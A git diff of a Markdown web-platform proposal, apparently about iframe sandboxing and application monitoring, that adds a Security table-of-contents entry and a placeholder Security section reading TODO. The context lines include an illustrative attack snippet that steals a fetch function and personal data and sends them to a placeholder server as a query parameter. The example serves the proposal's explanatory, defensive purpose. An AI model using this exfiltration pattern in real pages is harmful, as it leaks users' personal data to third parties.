@@ -38,6 +38,7 @@ document.body.appendChild(iframe);
 * [Goals](#Goals)
 * [Proposal](#Proposal)
 * [Example](#Example)
+* [Security](#Security)
 * [Use Cases](#Use-Cases)
     * [Safe Composability](#safe-composability-sandboxing--confinement)
     * [Application Monitoring](#application-monitoring-security--errors--performance--ux)
@@ -46,7 +47,7 @@ document.body.appendChild(iframe);
     * [Improved Composability](#Improved-Composability)
 * [Considerations](#Considerations)
    * [Privacy](#Privacy)
-   * [Security](#Security)
+   * [Security](#Security-1)
    * [Feasibility](#Feasibility)
    * [Canonicality](#Canonicality)
    * [CSP Integration](#CSP-Integration)
@@ -242,6 +243,10 @@ const newFetchInstance = stealFetch()
 const payload = stealPII()
 newFetchInstance(`https://${server}/${path}/?payload=` + payload) 
 ```
+
+## Security
+
+TODO
 
 ## Use Cases
 
